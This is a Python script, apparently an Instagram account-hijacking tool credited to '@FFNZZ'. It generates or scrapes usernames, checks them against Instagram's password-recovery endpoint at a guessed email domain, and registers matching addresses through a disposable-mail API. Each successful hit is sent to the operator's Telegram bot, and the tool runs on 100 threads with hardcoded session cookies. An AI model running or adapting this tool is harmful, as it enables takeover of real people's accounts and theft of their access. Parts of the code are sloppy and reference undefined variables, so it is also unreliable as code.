import random
import os
from user_agent import generate_user_agent
from random import randrange,choice
from random import randrange,choice
import requests; import base64
from rich.console import Console
from rich.live import Live
import requests
from user_agent import generate_user_agent
from asmix import Instagram
import ethan
import os
import requests
from user_agent import generate_user_agent
from time import time
from hashlib import md5
from random import choice
from concurrent.futures import ThreadPoolExecutor
from cfonts import render, say
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import random
import base64
import re
import ethan
import sys
from asmix import Instagram
import random
import string
import json
import requests
from threading import Thread
from rich.console import Console
Con = Console()
Ex = 0
b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
ED='\x1b[38;5;208m'
BLUE = '\033[94m'
Z = '\033[1;31m' #احمر
S = '\033[1;33m' #اصفر
O = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
M = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
U = '\x1b[1;37m'#ابیض
X = '\033[1;33m' #اصفر
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
R = '\033[1;31m' #احمر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.

jjk=ethan.logo('FFNZZ')
print(jjk)
token=input(f'{X}enter token :')
print('')
ID=input(f'{R}enter id :')
import os
hit=0
badig=0
badmil=0
goodig=0
bad_user=0
def info(email):
	users = email.split("@")[0]
	rest=Instagram.rest(users)
	ff=f'''
\ NEW IG HITS / 
----------------------------------
[user] = @{users}
[email] = {email}
[rest] = {rest}
----------------------------------
by @FFNZZ
	'''
	requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
def rest(user):
  global bad_user
  global goodig
  global hit
  global badig
  global badmil
  try:
    email=user+'@telegmail.com'
    headers = {
    	                        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }
  

        
        
        
        
    data = {
        f'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"' + email + '"}',
        'ig_sig_key_version': '4',
    }



            	
    respon = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
    tt=(f''' 
========================================================
    {F}hits :{hit}   
    
    {R}badmail :{badmil}    
    
    {ED}user:@{user}  
    
    {bo} badig :{badig} 
    
           {bo} bad user : {bad_user}
    
           good ig :{goodig}
{M}========================================================
    ''')
    os.system('clear')
    print(tt)
   
         
        
    	
    if '"status":"ok"' in respon:
      		goodig+=1
      		name = email.split("@")[0]
      		domen = email.split("@")[1]
      		headers = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
  'Accept': "application/json, text/plain, */*",  
  'authorization': "Basic bnVsbA==",  
  'origin': "https://hi2.in", 
  'accept-language': "en-US",
  'priority': "u=1, i,",  
}

	
	    		
      		response = requests.post("https://hi2.in/api/custom", data={'domain': "@" + domen,'prefix': name}, headers=headers)
      		data=response.text
      		if "error" in data:
      			badmil+=1
      		elif "hash" in data or "expiry" in data:
      			hit+=1
      			info(email)
      		
      		
    else:
    	badig+=1 
  
  except:
  	os.system('clear')
  	bad_user+=1
  	tt=(f''' 
========================================================
    {F}hits :{hit}   
    
    {R}badmail :{badmil}    
    
    {ED}user:@{user}  
    
    {bo} badig :{badig} 
    
    {bo} bad user : {bad_user}

               good ig :{goodig}    
{M}========================================================
    ''')
      	
  	print(tt)
 
def qcq():
  memo = random.randint(100, 300)
  O = f'\x1b[38;5;{memo}m'
  while True:
  	ur="".join(random.choice('po123456i0uytr9ewql8kjhgf7ds6amn5bvcxz')for x in range(5))
  	u="".join(random.choice('098poiuytrewqlkjhgfdsamnbvcxz76543211325476980')for x in range(4))
  	end=[ur,u]
  	user=random.choice(end)
  	rest(user)
def qqq():
    global Ex
    try:
        
        LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
       
        UseriD = str(random.randrange(900000,uid))
        
        variables = json.dumps({"id": UseriD, "render_surface": "PROFILE"})
        data = {"lsd": LsD, "variables": variables, "doc_id": "25618261841150840"}
        
        response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD}, data=data)
        
        
        user= response.json()['data']['user']['username']
        rest(user)
        
    
        return username
    except Exception as e:
    	return None



def ExUsers():
    for _ in range(1000):  
        qcq()

threads = []
for _ in range(100): 
    thread = Thread(target=ExUsers)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
from threading import Thread
for _ in range(100):
  Thread(target=qqq).start()
